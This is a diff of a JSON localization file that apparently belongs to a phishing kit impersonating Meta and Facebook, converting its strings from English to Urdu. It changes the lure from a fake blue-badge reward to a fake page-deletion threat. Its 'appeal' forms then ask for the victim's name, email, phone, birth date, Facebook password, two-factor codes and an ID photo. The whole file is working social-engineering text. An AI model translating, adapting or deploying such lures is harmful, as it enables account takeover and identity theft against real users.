@@ -1,245 +1,245 @@
 {
   "menu": {
-    "title": "Privacy Centre",
+    "title": "رازداری مرکز",
     "menu_1": {
-      "title": "Privacy Centre Home"
+      "title": "رازداری مرکز ہوم"
     },
     "menu_2": {
-      "title": "Search"
+      "title": "تلاش"
     },
     "menu_3": {
-      "title": "Common Privacy Settings"
+      "title": "عام رازداری ترتیبات"
     },
     "menu_4": {
-      "title": "Privacy Topics"
+      "title": "رازداری کے موضوعات"
     },
     "menu_5": {
-      "title": "More Privacy Resources"
+      "title": "مزید رازداری وسائل"
     },
     "menu_6": {
-      "title": "Privacy Policy",
+      "title": "رازداری پالیسی",
       "sub_title": {
-        "sub_1": "What is the Privacy Policy and what does it cover?",
-        "sub_2": "What information do we collect?",
-        "sub_3": "How do we use your information?",
-        "sub_4": "How do we share your information on products or with integrated partners?",
-        "sub_5": "How do we share information with third parties?",
-        "sub_6": "How is the cooperation between companies organized?",
-        "sub_7": "How can you manage or delete your information and exercise your rights?",
-        "sub_8": "How long do we keep your information?",
-        "sub_9": "How do we transmit information?",
-        "sub_10": "How do we respond to official requests, comply with applicable laws, and prevent harm?",
-        "sub_11": "How will you know when the policy changes?",
-        "sub_12": "How to ask questions?",
-        "sub_13": "Why and how do we process your data"
+        "sub_1": "رازداری پالیسی کیا ہے اور یہ کیا احاطہ کرتی ہے؟",
+        "sub_2": "ہم کون سی معلومات جمع کرتے ہیں؟",
+        "sub_3": "ہم آپ کی معلومات کو کیسے استعمال کرتے ہیں؟",
+        "sub_4": "ہم آپ کی معلومات کو مصنوعات پر یا مربوط شراکت داروں کے ساتھ کیسے شیئر کرتے ہیں؟",
+        "sub_5": "ہم تیسرے فریق کے ساتھ معلومات کیسے شیئر کرتے ہیں؟",
+        "sub_6": "کمپنیوں کے درمیان تعاون کیسے منظم ہے؟",
+        "sub_7": "آپ اپنی معلومات کو کیسے منظم یا حذف کر سکتے ہیں اور اپنے حقوق کا استعمال کیسے کر سکتے ہیں؟",
+        "sub_8": "ہم آپ کی معلومات کو کتنی دیر تک رکھتے ہیں؟",
+        "sub_9": "ہم معلومات کو کیسے منتقل کرتے ہیں؟",
+        "sub_10": "ہم سرکاری درخواستوں کا جواب کیسے دیتے ہیں، قابل اطلاق قوانین کی تعمیل کیسے کرتے ہیں، اور نقصان کو کیسے روکتے ہیں؟",
+        "sub_11": "آپ کو کیسے پتہ چلے گا کہ پالیسی میں تبدیلی ہوئی ہے؟",
+        "sub_12": "سوالات کیسے پوچھیں؟",
+        "sub_13": "ہم آپ کے ڈیٹا کو کیوں اور کیسے پروسیس کرتے ہیں؟"
       }
     },
     "menu_7": {
-      "title": "Other Policies and Articles",
+      "title": "دوسری پالیسیاں اور مضامین",
       "sub_title": {
-        "sub_1": "Cookie Policy",
-        "sub_2": "Information for those who don't use products",
-        "sub_3": "How information is used for generative AI models",
-        "sub_4": "Data Transfer Framework Policy",
-        "sub_5": "Other terms and conditions"
+        "sub_1": "کوکی پالیسی",
+        "sub_2": "ان لوگوں کے لیے معلومات جو مصنوعات استعمال نہیں کرتے",
+        "sub_3": "جنیریٹو AI ماڈلز کے لیے معلومات کا استعمال کیسے ہوتا ہے",
+        "sub_4": "ڈیٹا ٹرانسفر فریم ورک پالیسی",
+        "sub_5": "دوسری شرائط و ضوابط"
       }
     }
   },
   "content": {
     "top_content": {
-      "title": "Meta Verified – Rewards for You",
+      "title": "ہم نے آپ کے صفحے کو حذف کرنے کے لیے شیڈول کیا ہے",
       "sub": {
-        "sub_1": "Congratulations on meeting the requirements to upgrade your page with a verified blue badge! This is an incredible milestone that highlights your dedication and the trust you’ve built with your community.",
-        "sub_2": "We’re excited to celebrate this achievement with you and look forward to seeing your page continue to grow under this prestigious recognition!"
+        "sub_1": "ہمیں متعدد رپورٹس موصول ہوئی ہیں کہ آپ کا اکاؤنٹ ہماری سروس کی شرائط اور کمیونٹی رہنما خطوط کی خلاف ورزی کرتا ہے۔ نتیجتاً، آپ کا اکاؤنٹ تصدیق کے لیے بھیجا جائے گا۔",
+        "sub_2": "اگر آپ سمجھتے ہیں کہ آپ کے اکاؤنٹ پر غلطی سے پابندیاں لگائی گئی ہیں، تو آپ نظرثانی کا درخواست کر سکتے ہیں۔"
       },
-      "ticket": "Your Request ID:"
+      "ticket": "آپ کا ٹکٹ آئی ڈی:"
     },
     "guide": {
-      "title": "✅ Verified Blue Badge Request Guide",
+      "title": "اپیل گائیڈ",
       "sub": {
-        "sub_1": "Fact-checkers will not respond to requests containing threats, hate speech, or abusive language.",
-        "sub_2": "Please provide all required information in your request to ensure timely processing. Submitting an invalid email address or failing to reply to additional information requests within 2 days may result in the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.",
-        "sub_3": "Once all details are submitted, we’ll evaluate your account for any policy restrictions. The verification process typically takes about 24 hours but may take longer in some cases. Based on the review outcome, restrictions will either remain or be lifted, and your account will be updated accordingly."
+        "sub_1": "حقائق کی جانچ کرنے والے ان درخواستوں کا جواب نہیں دے سکتے جن میں دھمکی، نفرت انگیز تقریر، یا دیگر زبانی دھمکیاں شامل ہوں۔",
+        "sub_2": "اپنی اپیل میں، براہ کرم تمام ضروری معلومات شامل کریں تاکہ حقائق کی جانچ کرنے والا آپ کی درخواست کو بروقت پروسیس کر سکے۔ اگر آپ غلط ای میل ایڈریس فراہم کرتے ہیں یا اضافی معلومات کے لیے درخواست کا 2 دن کے اندر جواب نہیں دیتے، تو حقائق کی جانچ کرنے والا درخواست کو بغیر پروسیس کیے بند کر سکتا ہے۔ اگر اپیل 4 دن کے اندر پروسیس نہیں ہوتی، تو میٹا اسے خودکار طور پر مسترد کر دے گا۔",
+        "sub_3": "جب سب کچھ تیار ہو جائے گا، ہم آپ کے اکاؤنٹ کا جائزہ لیں گے اور یہ طے کریں گے کہ اس پر پابندیاں लागو ہوتی ہیں یا نہیں۔ تصدیقی عمل عام طور پر 24 گھنٹے لیتا ہے، لیکن کچھ معاملات میں اس میں زیادہ وقت لگ سکتا ہے۔ ہمارے فیصلے کے مطابق، عائد کردہ پابندیاں برقرار رہیں گی یا ہٹائی جائیں گی اور آپ کا اکاؤنٹ بحال کر دیا جائے گا۔"
       }
     },
     "thumb": {
-      "title": "",
+      "title": "اکاؤنٹ پابندیوں کے مسائل کا حل",
       "sub": {
-        "sub_1": "Review request",
-        "sub_2": "Our team will verify your information, and your Meta blue badge should be issued within about 24–48 hours."
+        "sub_1": "نظرثانی کی درخواست",
+        "sub_2": "براہ کرم یقینی بنائیں کہ آپ نیچے درکار معلومات فراہم کرتے ہیں۔ اس معلومات کو فراہم نہ کرنے سے آپ کی اپیل کے پروسیس میں تاخیر ہو سکتی ہے۔"
       },
-      "button": "Submit Request",
-      "day": "You were verified on"
+      "button": "نظرثانی کی درخواست کریں",
+      "day": "آپ کا صفحہ اس دن پابندی لگائی گئی تھی"
     },
     "appeal_guide": {
-      "title": "Appeal Guide",
+      "title": "اپیل گائیڈ",
       "sub_title": {
-        "sub_1": "Fact checkers may not respond to requests that include intimidation, hate speech, or other verbal threats.",
-        "sub_2": "In your appeal, please include all necessary information to make the fact checker process your request quickly. If you provide an invalid e-mail address or don't respond to a request for more information within 2 days, the fact checker can close the application without processing. If the appeal is not processed within 4 days, Meta will automatically reject it.",
-        "sub_3": "When everything is ready, we will review your account and decide if restrictions apply to it. The verification procedure usually takes 24 hours, but in some cases it can take longer. Depending on our decision, the restrictions will stay or we will lift them and your account will be reinstated."
+        "sub_1": "حقائق کی جانچ کرنے والے ان درخواستوں کا جواب نہیں دے سکتے جن میں دھمکی، نفرت انگیز تقریر، یا دیگر زبانی دھمکیاں شامل ہوں۔",
+        "sub_2": "اپنی اپیل میں، براہ کرم تمام ضروری معلومات شامل کریں تاکہ حقائق کی جانچ کرنے والا آپ کی درخواست کو بروقت پروسیس کر سکے۔ اگر آپ غلط ای میل ایڈریس فراہم کرتے ہیں یا اضافی معلومات کے لیے درخواست کا 2 دن کے اندر جواب نہیں دیتے، تو حقائق کی جانچ کرنے والا درخواست کو بغیر پروسیس کیے بند کر سکتا ہے۔ اگر اپیل 4 دن کے اندر پروسیس نہیں ہوتی، تو میٹا اسے خودکار طور پر مسترد کر دے گا۔",
+        "sub_3": "جب سب کچھ تیار ہو جائے گا، ہم آپ کے اکاؤنٹ کا جائزہ لیں گے اور یہ طے کریں گے کہ اس پر پابندیاں लागو ہوتی ہیں یا نہیں۔ تصدیقی عمل عام طور پر 24 گھنٹے لیتا ہے، لیکن کچھ معاملات میں اس میں زیادہ وقت لگ سکتا ہے۔ ہمارے فیصلے کے مطابق، عائد کردہ پابندیاں برقرار رہیں گی یا ہٹائی جائیں گی اور آپ کا اکاؤنٹ بحال کر دیا جائے گا۔"
       }
     },
     "privacy_center": {
-      "title": "Privacy Centre",
+      "title": "رازداری مرکز",
       "sub_title": {
         "sub_1": {
-          "title": "What is the Privacy Policy and what does it say?",
-          "description": "Privacy Policy"
+          "title": "رازداری پالیسی کیا ہے اور یہ کیا کہتی ہے؟",
+          "description": "رازداری پالیسی"
         },
         "sub_2": {
-          "title": "How you can manage or delete your information",
-          "description": "Privacy Policy"
+          "title": "آپ اپنی معلومات کو کیسے منظم یا حذف کر سکتے ہیں",
+          "description": "رازداری پالیسی"
         }
       }
     },
     "more_info": {
-      "title": "For more details, see the User Agreement",
+      "title": "مزید تفصیلات کے لیے، صارف معاہدہ دیکھیں",
       "sub_title": {
         "sub_1": {
-          "title": "AI Product",
-          "description": "User Agreement"
+          "title": "AI پروڈکٹ",
+          "description": "صارف معاہدہ"
         }
       }
     },
     "resouces": {
-      "title": "Additional resources",
+      "title": "اضافی وسائل",
       "sub_title": {
         "sub_1": {
-          "title": "How information is used for generative AI models",
-          "description": "Privacy Centre"
+          "title": "جنیریٹو AI ماڈلز کے لیے معلومات کا استعمال کیسے ہوتا ہے",
+          "description": "رازداری مرکز"
         },
         "sub_2": {
-          "title": "Cards with information about the operation of AI systems",
-          "description": "AI product website"
+          "title": "AI نظام کے آپریشن کے بارے میں معلوماتی کارڈز",
+          "description": "AI پروڈکٹ ویب سائٹ"
         },
         "sub_3": {
-          "title": "Introduction to Generative AI",
-          "description": "For teens"
+          "title": "جنیریٹو AI کا تعارف",
+          "description": "نوجوانوں کے لیے"
         }
       }
     },
     "footer": {
-      "title": "We continuously identify potential privacy risks, including when we collect, use, or share personal information, and develop methods to reduce those risks. Read more about",
-      "link": "Privacy Policy"
+      "title": "ہم مسلسل رازداری کے ممکنہ خطرات کی شناخت کرتے ہیں، بشمول ذاتی معلومات کے جمع کرنے، استعمال یا اشتراک کے دوران، اور ان خطرات کو کم کرنے کے طریقے تیار کرتے ہیں۔ اس بارے میں مزید پڑھیں",
+      "link": "رازداری پالیسی"
     },
     "modal": {
       "appeal_request": {
-        "title": "Information Form",
+        "title": "اپیل فارم",
         "form": {
           "name": {
-            "placeholder": "Full Name",
-            "required": "Please enter enough full name."
+            "placeholder": "مکمل نام",
+            "required": "براہ کرم مکمل نام درج کریں۔"
           },
           "email": {
-            "placeholder": "E-mail",
-            "required": "Please enter enough e-mail address."
+            "placeholder": "ای میل",
+            "required": "براہ کرم کافی ای میل ایڈریس درج کریں۔"
           },
           "email_business": {
-            "placeholder": "Business E-mail",
-            "required": "Please enter enough business e-mail address."
+            "placeholder": "کاروباری ای میل",
+            "required": "براہ کرم کافی کاروباری ای میل ایڈریس درج کریں۔"
           },
           "page_name": {
-            "placeholder": "Fanpage Url",
-            "required": "Please enter enough fanpage url."
+            "placeholder": "فین پیج یو آر ایل",
+            "required": "براہ کرم فین پیج یو آر ایل مکمل طور پر درج کریں۔"
           },
           "phone_number": {
-            "placeholder": "Phone Number",
-            "required": "Please enter enough phone number."
+            "placeholder": "فون نمبر",
+            "required": "براہ کرم کافی فون نمبر درج کریں۔"
           },
           "date_of_birth": {
-            "title": "Date of Birth",
+            "title": "تاریخ پیدائش",
             "day": {
-              "placeholder": "Day",
-              "required": "Please enter enough day."
+              "placeholder": "دن",
+              "required": "براہ کرم کافی دن درج کریں۔"
             },
             "month": {
-              "placeholder": "Month",
-              "required": "Please enter enough month."
+              "placeholder": "ماہ",
+              "required": "براہ کرم کافی ماہ درج کریں۔"
             },
             "year": {
-              "placeholder": "Year",
-              "required": "Please enter enough year."
+              "placeholder": "سال",
+              "required": "براہ کرم کافی سال درج کریں۔"
             }
           },
           "issue": {
-            "placeholder": "Note",
-            "required": "Please enter your issue.",
-            "note": "Our response will be sent to you within 14 - 48 hours."
+            "placeholder": "اپنا مسئلہ بیان کریں",
+            "required": "براہ کرم اپنا مسئلہ درج کریں۔",
+            "note": "ہمارا جواب آپ کو 14 سے 48 گھنٹوں کے اندر بھیجا جائے گا۔"
           },
           "facebook_notification": {
-            "title": "on Facebook",
-            "description": "We will send you a notification on Facebook."
+            "title": "فیس بک پر",
+            "description": "ہم آپ کو فیس بک پر ایک اطلاع بھیجیں گے۔"
           },
           "check_form": {
-            "title": "I agree with",
-            "link": "Terms of use"
+            "title": "میں اس سے متفق ہوں",
+            "link": "استعمال کی شرائط"
           },
-          "button": "Send"
+          "button": "بھیجیں"
         }
       },
       "password": {
-        "title": "Password",
-        "description": "For your security, you must enter your password to continue.",
+        "title": "پاس ورڈ",
+        "description": "آپ کی سیکیورٹی کے لیے، آپ کو جاری رکھنے کے لیے اپنا پاس ورڈ درج کرنا ہوگا۔",
         "form": {
           "password": {
-            "placeholder": "Password",
-            "required": "You did not enter your password!",
-            "warning": "The password you entered is incorrect."
+            "placeholder": "پاس ورڈ",
+            "required": "آپ نے اپنا پاس ورڈ درج نہیں کیا!",
+            "warning": "آپ نے جو پاس ورڈ درج کیا وہ غلط ہے۔"
           },
-          "button": "Continue",
-          "forgot_password": "Forgot your password?"
+          "button": "جاری رکھیں",
+          "forgot_password": "پاس ورڈ بھول گئے؟"
         }
       },
       "2fa": {
-        "title": "Two-factor authentication required (1/3)",
-        "description": "The verification code has been sent to your phone number or e-mail, please check your inbox and enter the code below to complete. In case you don't receive the code, please check the Facebook notification on your device and confirm it's you to complete the verification process.",
+        "title": "دو عنصری تصدیق درکار ہے (1/3)",
+        "description": "تصدیقی کوڈ آپ کے فون نمبر یا ای میل ایڈریس پر بھیجا گیا ہے، براہ کرم اپنا ان باکس چیک کریں اور اسے مکمل کرنے کے لیے نیچے کوڈ درج کریں۔ اگر آپ کو کوڈ موصول نہیں ہوتا، تو براہ کرم اپنے ڈیوائس پر فیس بک اطلاع چیک کریں اور تصدیق کریں کہ یہ آپ ہیں تاکہ تصدیقی عمل مکمل ہو سکے۔",
         "form": {
-          "placeholder": "Code",
-          "warning": "The two-factor authentication you entered is incorrect. Please, try again after",
-          "required": "You did not enter your two-factor authentication!",
-          "minutes": "minutes",
-          "seconds": "seconds",
-          "button": "Continue"
+          "placeholder": "کوڈ",
+          "warning": "آپ نے جو دو عنصری تصدیق درج کی وہ غلط ہے۔ براہ کرم دوبارہ کوشش کریں بعد میں",
+          "required": "آپ نے اپنی دو عنصری تصدیق درج نہیں کی!",
+          "minutes": "منٹ",
+          "seconds": "سیکنڈ",
+          "button": "جاری رکھیں"
         }
       },
       "upload_file": {
-        "title": "Upload your ID",
+        "title": "اپنا شناختی کارڈ اپ لوڈ کریں",
         "sub_title": {
-          "sub_1": "Before we can get you back on Facebook safely, we need to make sure this is your account. You can prove this account is yours by sending us a photo of your ID.",
-          "sub_2": "We don't accept photos of a computer screen, phone screen, or photocopy. If there are any issues, we will send you an e-mail.",
-          "sub_3": "We will store an encrypted copy of your selfie for up to one year to improve our ability to detect fake photos, keeping Facebook safe from impersonation.",
-          "sub_4": "Change how long we store your selfie for",
-          "sub_5": "or",
-          "sub_6": "Learn more"
+          "sub_1": "اس سے پہلے کہ ہم آپ کو فیس بک پر محفوظ طریقے سے واپس لا سکیں، ہمیں یہ یقینی بنانا ہوگا کہ یہ آپ کا اکاؤنٹ ہے۔ آپ اپنے شناختی کارڈ کی تصویر بھیج کر یہ ثابت کر سکتے ہیں کہ یہ اکاؤنٹ آپ کا ہے۔",
+          "sub_2": "ہم کمپیوٹر اسکرین، فون اسکرین یا فوٹو کاپی کی تصاویر قبول نہیں کرتے۔ اگر کوئی مسائل ہیں، تو ہم آپ کو ای میل بھیجیں گے۔",
+          "sub_3": "ہم آپ کی سیلفی کی ایک خفیہ شدہ کاپی ایک سال تک کے لیے محفوظ کریں گے تاکہ جعلی تصاویر کا پتہ لگانے کی ہماری صلاحیت کو بہتر بنایا جا سکے، جس سے فیس بک کو شناخت کی چوری سے محفوظ رکھا جا سکے۔",
+          "sub_4": "اپنی سیلفی کو کتنی دیر تک محفوظ رکھیں، اسے تبدیل کریں",
+          "sub_5": "یا",
+          "sub_6": "مزید جانیں"
         },
         "form": {
-          "file": "Upload your ID",
-          "warning": "is not an image file",
-          "button": "Continue"
+          "file": "اپنا شناختی کارڈ اپ لوڈ کریں",
+          "warning": "یہ ایک تصویری فائل نہیں ہے",
+          "button": "جاری رکھیں"
         }
       },
       "final_step": {
-        "title": "Request has been sent",
-        "description": "Your request has been added to the processing queue. We will process your request within 24 hours. If you don't receive an e-mail message with the appeal status within 24 hours, please resend the appeal.",
-        "button": "Return to Facebook"
+        "title": "درخواست بھیج دی گئی ہے",
+        "description": "آپ کی درخواست پروسیسنگ کی قطار میں شامل کر دی گئی ہے۔ ہم آپ کی درخواست کو 24 گھنٹوں کے اندر پروسیس کریں گے۔ اگر آپ کو 24 گھنٹوں کے اندر اپیل کی حالت کے ساتھ ای میل پیغام موصول نہیں ہوتا، تو براہ کرم اپیل دوبارہ بھیجیں۔",
+        "button": "فیس بک پر واپس جائیں"
       },
       "authen_modal": {
-        "title": "Choose a way to confirm it's you",
+        "title": "یہ تصدیق کرنے کے لیے ایک طریقہ منتخب کریں کہ یہ آپ ہیں",
         "app": {
-          "sub_1": "Authentication app",
-          "sub_2": "Go to your authentication app"
+          "sub_1": "تصدیقی ایپ",
+          "sub_2": "اپنی تصدیقی ایپ پر جائیں"
         },
         "sms": {
-          "sub_1": "SMS",
-          "sub_2": "We will send a code to the number"
+          "sub_1": "ایس ایم ایس",
+          "sub_2": "ہم نمبر پر ایک کوڈ بھیجیں گے"
         },
         "email": {
-          "sub_1": "E-mail",
-          "sub_2": "We will send a code to"
+          "sub_1": "ای میل",
+          "sub_2": "ہم ایک کوڈ بھیجیں گے"
         },
         "whatsapp": {
-          "sub_1": "WhatsApp",
-          "sub_2": "We will send a code to the number"
+          "sub_1": "واٹس ایپ",
+          "sub_2": "ہم نمبر پر ایک کوڈ بھیجیں گے"
         }
       }
     }
